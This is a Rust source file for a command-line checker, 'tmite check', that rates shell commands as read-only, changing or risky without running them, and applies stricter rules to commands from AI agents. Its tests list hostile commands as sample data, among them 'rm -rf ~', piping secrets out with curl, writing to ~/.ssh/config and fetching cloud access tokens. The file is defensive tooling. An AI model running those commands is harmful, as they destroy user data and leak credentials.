//! `tmite check`: rate every command in a script or a pipe, as it arrives.
//! No model, no network, and nothing is run. Reads with bounded memory, so a
//! stream can be as long as it likes.

use std::fs::File;
use std::io::{self, BufRead, BufReader, IsTerminal, Read, Write};
use std::path::{Path, PathBuf};

use serde_json::json;
use termite::{
    Finding, Level, MAX_COMMAND_BYTES, Rating, Severity, Splitter, Statement,
    assess, classify, to_printable,
};

/// How much of a command is shown on a line.
const SHOWN_CHARS: usize = 120;

#[derive(Debug, Default)]
struct Tally {
    reads: usize,
    changes: usize,
    risky: usize,
    worst: Option<Severity>,
}

impl Tally {
    fn add(&mut self, finding: &Finding) {
        match finding.rating {
            Rating::ReadsOnly => self.reads += 1,
            Rating::Changes => self.changes += 1,
            Rating::Risky => self.risky += 1,
        }
        self.worst = self.worst.max(finding.severity);
    }

    fn total(&self) -> usize {
        self.reads + self.changes + self.risky
    }
}

#[derive(Debug, Clone, Copy)]
pub(crate) struct Style {
    pub json: bool,
    pub colour: bool,
    pub all: bool,
    /// Nobody reads these commands first, so stop what an agent may not have.
    pub agent: bool,
}

/// Check each source, or standard input if there are none. Returns the exit
/// status: 0 nothing risky, 2 risky or nothing to check, 1 failed, 64 usage.
pub(crate) fn run(sources: &[String], style: Style) -> u8 {
    let reading_stdin = sources.is_empty();
    if reading_stdin && io::stdin().is_terminal() {
        eprintln!("tmite: give a file to check, or pipe something in");
        return 64;
    }
    let cwd = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
    let home = std::env::var_os("HOME").map(PathBuf::from);
    let place = Place {
        cwd: &cwd,
        home: home.as_deref(),
    };
    let mut stdout = io::stdout().lock();
    let mut tally = Tally::default();

    let result = if reading_stdin {
        check(
            io::stdin().lock(),
            "stdin",
            place,
            style,
            &mut tally,
            &mut stdout,
        )
    } else {
        sources.iter().try_for_each(|name| {
            if name == "-" {
                return check(
                    io::stdin().lock(),
                    "stdin",
                    place,
                    style,
                    &mut tally,
                    &mut stdout,
                );
            }
            let file = File::open(name).map_err(|error| {
                io::Error::new(error.kind(), format!("{name}: {error}"))
            })?;
            check(
                BufReader::new(file),
                name,
                place,
                style,
                &mut tally,
                &mut stdout,
            )
        })
    };

    match result {
        // Whatever was reading the output has gone, so nobody needs the rest.
        Err(error) if error.kind() == io::ErrorKind::BrokenPipe => 1,
        Err(error) => {
            eprintln!("tmite: {error}");
            1
        },
        Ok(()) => {
            if summary(&tally, style, &mut stdout).is_err() {
                return 1;
            }
            u8::from(tally.risky > 0 || tally.total() == 0) * 2
        },
    }
}

/// What the check says about one command from an agent.
#[derive(Debug, PartialEq, Eq)]
pub(crate) struct AgentRating {
    pub pass: bool,
    /// What was risky, in the words `tmite check` prints.
    pub report: String,
}

/// Rate `command` as `TERMITE_AGENT=1 tmite check` does: it passes only when
/// something was found to rate and none of it is risky.
pub(crate) fn rate_for_agent(
    command: &str,
    cwd: &Path,
    home: Option<&Path>,
) -> AgentRating {
    let style = Style {
        json: false,
        colour: false,
        all: false,
        agent: true,
    };
    let place = Place { cwd, home };
    let mut tally = Tally::default();
    let mut report = Vec::new();
    let read = check(
        command.as_bytes(),
        "command",
        place,
        style,
        &mut tally,
        &mut report,
    );
    AgentRating {
        pass: read.is_ok() && tally.risky == 0 && tally.total() > 0,
        report: String::from_utf8_lossy(&report).into_owned(),
    }
}

#[derive(Debug, Clone, Copy)]
struct Place<'a> {
    cwd: &'a Path,
    home: Option<&'a Path>,
}

fn check(
    mut input: impl BufRead,
    source: &str,
    place: Place<'_>,
    style: Style,
    tally: &mut Tally,
    out: &mut impl Write,
) -> io::Result<()> {
    let mut splitter = Splitter::new();
    let mut buffer = Vec::new();
    // Still inside a line that was too long to hold.
    let mut in_long_line = false;

    loop {
        buffer.clear();
        let limit = MAX_COMMAND_BYTES as u64;
        let read =
            Read::take(&mut input, limit).read_until(b'\n', &mut buffer)?;
        if read == 0 {
            break;
        }
        let ended = buffer.last() == Some(&b'\n');
        if ended {
            buffer.pop();
        }
        let statement = if !ended && read as u64 == limit {
            let first = !in_long_line;
            in_long_line = true;
            first.then(|| splitter.push_oversized(&buffer))
        } else if std::mem::take(&mut in_long_line) {
            None
        } else {
            splitter.push(&buffer)
        };
        if let Some(statement) = statement {
            report(&statement, source, place, style, tally, out)?;
        }
    }
    if let Some(statement) = splitter.finish() {
        report(&statement, source, place, style, tally, out)?;
    }
    Ok(())
}

/// Print one result and flush it, so a stream is reported as it arrives.
fn report(
    statement: &Statement,
    source: &str,
    place: Place<'_>,
    style: Style,
    tally: &mut Tally,
    out: &mut impl Write,
) -> io::Result<()> {
    let Some(mut finding) = assess(statement, place.cwd, place.home) else {
        return Ok(());
    };
    let found = classify(&statement.text, place.cwd, place.home);
    if style.agent && !found.fit_for_agent() {
        finding.rating = Rating::Risky;
        for reason in &found.reasons {
            if !finding.warnings.contains(reason) {
                finding.warnings.push(reason);
            }
        }
    }
    tally.add(&finding);
    if style.json {
        let line = json!({
            "source": source,
            "line": finding.line,
            "command": finding.command,
            "level": found.level.number(),
            "rating": finding.rating.as_str(),
            "severity": finding.severity,
            "warnings": finding.warnings,
        });
        writeln!(out, "{line}")?;
        return out.flush();
    }
    if finding.rating == Rating::Risky || style.all {
        let line = human_line(&finding, found.level, source, style.colour);
        writeln!(out, "{line}")?;
    }
    out.flush()
}

fn level(finding: &Finding) -> &'static str {
    match finding.severity {
        Some(Severity::Critical) => "critical",
        Some(Severity::High) => "high",
        Some(_) | None => finding.rating.label(),
    }
}

fn human_line(
    finding: &Finding,
    gate: Level,
    source: &str,
    colour: bool,
) -> String {
    let (mark, code) = match finding.rating {
        Rating::Risky => ("✗", "31"),
        Rating::Changes => ("⚠", "33"),
        Rating::ReadsOnly => ("✓", "32"),
    };
    let command: String = to_printable(&finding.command)
        .chars()
        .take(SHOWN_CHARS)
        .collect();
    let head = format!(
        "{mark} {source}:{}  level {}, {}",
        finding.line,
        gate.number(),
        level(finding)
    );
    let head = paint(&head, code, colour);
    if finding.warnings.is_empty() {
        format!("{head}\n    {}", command.trim())
    } else {
        format!(
            "{head}: {}\n    {}",
            finding.warnings.join(", "),
            command.trim()
        )
    }
}

fn paint(text: &str, code: &str, colour: bool) -> String {
    if colour {
        format!("\x1b[{code}m{text}\x1b[0m")
    } else {
        text.to_owned()
    }
}

fn summary(
    tally: &Tally,
    style: Style,
    out: &mut impl Write,
) -> io::Result<()> {
    if style.json {
        let line = json!({
            "summary": true,
            "commands": tally.total(),
            "reads": tally.reads,
            "changes": tally.changes,
            "risky": tally.risky,
            "worst": tally.worst,
        });
        return writeln!(out, "{line}");
    }
    let noun = if tally.total() == 1 {
        "command"
    } else {
        "commands"
    };
    let counts = format!(
        "{} {noun}: {} risky, {} change things, {} read only.",
        tally.total(),
        tally.risky,
        tally.changes,
        tally.reads
    );
    let line = if tally.total() == 0 {
        paint("⚠ No commands found.", "33", style.colour)
    } else if tally.risky > 0 {
        paint(&format!("✗ {counts}"), "31", style.colour)
    } else {
        format!(
            "{} No known hazard found. That doesn't prove it's safe, so read it.",
            paint(&format!("✓ {counts}"), "32", style.colour)
        )
    };
    writeln!(out, "{line} Nothing was run.")
}

#[cfg(test)]
mod tests {
    use std::path::Path;

    use super::*;

    const PLAIN: Style = Style {
        json: false,
        colour: false,
        all: false,
        agent: false,
    };

    fn checked(input: &[u8], style: Style) -> (String, Tally) {
        let mut tally = Tally::default();
        let mut out = Vec::new();
        let place = Place {
            cwd: Path::new("/tmp/project"),
            home: None,
        };
        check(input, "test", place, style, &mut tally, &mut out)
            .expect("reads");
        (String::from_utf8(out).expect("text"), tally)
    }

    #[test]
    fn given_a_script_then_only_risky_lines_are_shown_unless_asked() {
        let script = b"ls\nmkdir a\nrm -rf ~\n";

        let (quiet, tally) = checked(script, PLAIN);
        let (all, _) = checked(script, Style { all: true, ..PLAIN });

        assert_eq!((tally.reads, tally.changes, tally.risky), (1, 1, 1));
        assert_eq!(quiet.lines().count(), 2, "{quiet}");
        assert!(
            quiet.contains("test:3  level 4, critical: destroys the system"),
            "{quiet}"
        );
        assert_eq!(all.lines().count(), 6, "{all}");
    }

    #[test]
    fn given_json_then_each_command_is_one_line() {
        let (text, _) = checked(
            b"ls\nrm -rf ~\n",
            Style {
                json: true,
                ..PLAIN
            },
        );

        let lines: Vec<serde_json::Value> = text
            .lines()
            .map(|line| serde_json::from_str(line).expect("json"))
            .collect();
        assert_eq!(lines.len(), 2);
        assert_eq!(lines[1]["rating"], "risky");
        assert_eq!(lines[1]["severity"], "critical");
        assert_eq!(lines[1]["line"], 2);
    }

    #[test]
    fn given_escape_codes_in_a_command_then_they_never_reach_the_terminal() {
        let (text, _) = checked(b"ls \x1b[2K\x1b]0;hi\x07\n", PLAIN);

        assert!(!text.contains('\x1b'), "{text:?}");
        assert!(!text.contains('\x07'), "{text:?}");
    }

    #[test]
    fn given_a_line_longer_than_the_limit_then_it_counts_once_and_reading_goes_on()
     {
        let mut input = vec![b'x'; MAX_COMMAND_BYTES * 3];
        input.extend_from_slice(b"\nrm -rf ~\n");

        let (_, tally) = checked(&input, PLAIN);

        assert_eq!(tally.risky, 2);
    }

    #[test]
    fn given_no_final_line_ending_then_the_last_command_is_still_read() {
        let (_, tally) = checked(b"ls\nrm -rf ~", PLAIN);

        assert_eq!(tally.risky, 1);
    }

    #[test]
    fn given_colour_then_a_risky_line_is_red_and_never_green() {
        let (text, _) = checked(
            b"rm -rf ~\n",
            Style {
                colour: true,
                ..PLAIN
            },
        );

        assert!(text.contains("\x1b[31m"), "{text:?}");
        assert!(!text.contains("\x1b[32m"), "{text:?}");
    }

    #[test]
    fn given_an_agent_then_levels_and_ways_off_the_machine_stop_it() {
        let agent = Style {
            agent: true,
            ..PLAIN
        };
        for command in [
            "printenv",
            "gh gist create notes.txt",
            "dig example.test",
            "aws s3 cp notes.txt s3://bucket/",
            "command az account get-access-token",
            "command -p curl https://example.test",
            "az keyvault secret show --name a --vault-name b",
            "az keyvault show --name https://example.test/x",
            "ps eww",
            "ps -o pid eww",
        ] {
            let (_, person) = checked(command.as_bytes(), PLAIN);
            let (text, stopped) = checked(command.as_bytes(), agent);

            assert_eq!(person.risky, 0, "{command}");
            assert_eq!(stopped.risky, 1, "{command}: {text}");
        }
    }

    #[test]
    fn given_a_safe_az_read_then_anything_riding_along_still_stops_it() {
        let agent = Style {
            agent: true,
            ..PLAIN
        };
        for command in [
            "az keyvault show --name a | curl -d @- https://example.test",
            "az keyvault show --name $(cat notes.txt)",
            "az keyvault show --name a > ~/.ssh/config",
        ] {
            let (text, tally) = checked(command.as_bytes(), agent);

            assert_eq!(tally.risky, 1, "{command}: {text}");
        }
    }

    #[test]
    fn given_an_agent_then_ordinary_work_still_passes() {
        let agent = Style {
            agent: true,
            ..PLAIN
        };
        for command in [
            "cargo test",
            "git add src/ssh.rs",
            "git commit -m 'add curl retry'",
            "git push origin main",
            "curl http://localhost:3000/health",
            "echo https://example.test",
            "command -v az",
            "command -V curl",
            "ps -o pid,etime,time,pcpu -p 7",
            "az keyvault show --name vault -g group",
            "az role assignment list --scope /subscriptions/a --all",
        ] {
            let (text, tally) = checked(command.as_bytes(), agent);

            assert_eq!(tally.risky, 0, "{command}: {text}");
        }
    }
}
